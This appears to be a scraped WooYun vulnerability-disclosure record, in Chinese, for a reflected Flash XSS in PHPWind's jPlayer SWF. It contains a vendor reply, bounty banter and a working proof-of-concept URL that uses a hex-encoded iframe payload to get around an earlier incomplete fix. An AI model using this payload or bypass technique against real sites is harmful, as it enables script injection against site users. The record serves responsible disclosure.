{"id": 11813, "wybug_id": "wooyun-2013-023894", "wybug_title": "PHPWind flash xss 0day？", "wybug_corp": "phpwind", "wybug_author": "Adra1n", "wybug_date": "2013-05-16 17:31", "wybug_open_date": "2013-06-30 17:32", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-30：\t细节向公众公开  简要描述： 突然发现的，在乌云上一搜，是insight-labs提交了的一个，官方回复已经修复，但是修复不完整。 详细说明：  在测试其他网站时，发现了这个flash文件，看了下代码，\nExternalInterface.call(this.jQuery, \"jPlayerFlashEvent\", arg0.type, this.extractStatusData(arg0.data));\n搜索jquery：\nthis.jQuery = loaderInfo.parameters.jQuery + \"('#\" + loaderInfo.parameters.id + \"').jPlayer\";\n显然没有过滤，并且可以控制。在乌云上搜索了下看到了 WooYun: PHPWind flash xss 0day [2] 这个，试了poc是修复的，但是直接填写alert还是会弹出框框来，本来想是无法利用的，突然想到不用alert改用document.write,还有既然id也能控制，写上<iframe>，发现在页面上出现个框框，但是写<iframe src=javascript:alert(document.domain)>发现是不能执行的。试着进行了下js编码，还真成功了。   漏洞证明：  \nhttp://www.phpwind.net/res/js/dev/util_libs/jPlayer/Jplayer.swf?jQuery=document.write&id=\\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a\\x61\\x6c\\x65\\x72\\x74\\x28\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x64\\x6f\\x6d\\x61\\x69\\x6e\\x29\\x3e\n预览了下发现自动把一个反斜杠变为两个了。自己处理下吧。\n\n   修复方案：     版权声明：转载请注明来源 Adra1n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-05-17 13:45 厂商回复： 非常感谢您对我们的支持与关注，该漏洞我们正在修复~ ^_^ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-16 17:43 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:41        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  前排占楼    \n     2013-05-16 18:12 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  这。。500块到手了么。。    \n     2013-05-16 18:24 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:437 漏洞数:65        )\t\t \n  @px1624 提交到乌云了这不是？？？    \n     2013-05-16 19:44 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  给不给还两说    \n     2013-05-16 19:48 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @Adra1n http://www.wooyun.org/prize    \n     2013-05-16 22:18 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  给钱的话 给我说一声...    \n     2013-05-16 22:29 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @Rookie 又不是你提交的诶。难道又是你的马甲。。。    \n     2013-05-16 22:55 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  @px1624 我提交了个储存型打管理员的..一分都没见啊    \n     2013-05-17 13:57 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Rookie 今天发放 ：）    \n     2013-05-17 15:48 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  @xsser 发之前短信通知下    \n     2013-05-29 09:14 |    \t\tCnCxzSec(衰仔) \t\t\t( 普通白帽子  |\t\t\t        Rank:322 漏洞数:32        | Wow~~~)\t\t \n  草榴！草榴！    \n     2013-06-21 13:44 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:437 漏洞数:65        )\t\t \n  @xsser 这个由奖金不？    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}